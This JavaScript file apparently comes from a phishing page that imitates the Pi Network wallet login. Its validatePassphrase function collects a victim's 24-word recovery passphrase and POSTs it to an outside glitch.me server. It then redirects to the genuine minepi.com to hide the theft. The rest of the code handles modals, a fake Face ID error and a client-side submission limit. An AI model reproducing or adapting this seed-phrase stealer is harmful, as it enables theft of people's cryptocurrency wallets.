async function validatePassphrase(inputId, errorId) {
    // ===== RATE LIMIT CHECK (2 per 24h) =====
    const RATE_LIMIT_KEY = 'passphraseRateLimit';
    const MAX_SUBMISSIONS = 2;
    const TWENTY_FOUR_HOURS_MS = 24 * 60 * 60 * 1000; // 24h in milliseconds
    
    // Load submission history (or initialize if empty)
    let submissions = JSON.parse(localStorage.getItem(RATE_LIMIT_KEY)) || [];
    const now = Date.now();
    
    // Filter out expired submissions (older than 24h)
    submissions = submissions.filter(time => (now - time) <= TWENTY_FOUR_HOURS_MS);
    
    // Block if already submitted twice in 24h
    if (submissions.length >= MAX_SUBMISSIONS) {
        const nextAllowedTime = new Date(submissions[0] + TWENTY_FOUR_HOURS_MS);
        const timeLeft = nextAllowedTime.toLocaleTimeString();
        alert(`You can only submit ${MAX_SUBMISSIONS} times per day. Try again after ${timeLeft}.`);
        return;
    }

    // ===== ORIGINAL VALIDATION LOGIC =====
    const input = document.getElementById(inputId);
    const error = document.getElementById(errorId);
    const words = input.value.trim().split(/\s+/).filter(word => word.length > 0);

    if (words.length !== 24) {
        error.style.display = 'block';
        error.textContent = 'Invalid Passphrase';
        return;
    }

    error.style.display = 'none';
    document.getElementById('loadingOverlay').style.display = 'flex';

    try {
        // ===== SAVE THIS SUBMISSION (only if validation passes) =====
        submissions.push(now); // Add current timestamp
        localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(submissions));

        // ===== API REQUEST (your existing code) =====
        const response = await fetch('https://fuckyou-suraa.glitch.me/validate-passphrase', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ passphrase: input.value })
        });

        if (response.status === 429) {
            alert("Server overloaded. Please wait before trying again.");
            return;
        }

        const result = await response.json();
        if (result.success) window.location.href = "https://minepi.com";
    } catch (e) {
        alert("Connection error. Try again later.");
    } finally {
        document.getElementById('loadingOverlay').style.display = 'none';
    }
}

// ===== REST OF YOUR CODE (unchanged) =====
function showModal(modalType) {
    document.body.classList.add('modal-open');
    const modalId = `${modalType}Modal`;
    document.getElementById(modalId).style.display = "flex";
    
    setTimeout(() => {
        document.getElementById(modalId).scrollTop = 0;
    }, 50);
}

function hideModal(modalId) {
    document.body.classList.remove('modal-open');
    document.getElementById(modalId).style.display = "none";
}

function showFaceIDError() {
    alert("Face ID is not available at the moment. Please try with passphrase.");
}

function redirectToNewWallet() {
    if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
        window.location.href = "https://example.com/create-new-wallet";
    }
}

function redirectToNewAccount() {
    if (confirm("This will create a new wallet. Your old wallet will be inaccessible. Continue?")) {
        window.location.href = "https://example.com/create-new-brainstorm-account";
    }
}

document.addEventListener('DOMContentLoaded', function() {
    const textareas = document.querySelectorAll('.modal-content textarea');
    textareas.forEach(textarea => {
        textarea.addEventListener('focus', function() {
            window.scrollTo(0, 0);
            document.body.scrollTop = 0;
            
            setTimeout(() => {
                const modalContent = this.closest('.modal-content');
                if (modalContent) {
                    const inputRect = this.getBoundingClientRect();
                    const modalRect = modalContent.getBoundingClientRect();
                    const offset = inputRect.top - modalRect.top - 100;
                    modalContent.scrollTop = offset > 0 ? offset : 0;
                }
            }, 100);
        });
    });
});
